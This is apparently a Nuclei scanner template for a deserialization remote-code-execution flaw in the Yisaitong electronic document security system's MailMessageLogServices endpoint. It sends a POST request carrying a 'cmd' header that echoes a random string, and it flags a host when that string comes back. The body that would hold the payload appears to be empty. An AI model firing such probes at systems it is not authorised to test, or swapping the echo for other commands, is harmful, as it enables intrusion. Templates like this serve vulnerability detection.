id: yisaitong-MailMessageLogServices-rce

info:
  name: 亿赛通电子文档安全管理系统 MailMessageLogServices反序列漏洞
  author: yisaitong
  severity: high
  tags: yisaitong

http:
  - raw:
      - |
        POST /CDGServer3/MailMessageLogServices HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
        cmd: echo {{randstr}}
        Accept-Encoding: gzip, deflate
        Connection: close

        

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{{randstr}}'
      - type: dsl
        dsl:
          - 'len(body) < 350'
    matchers-condition: and
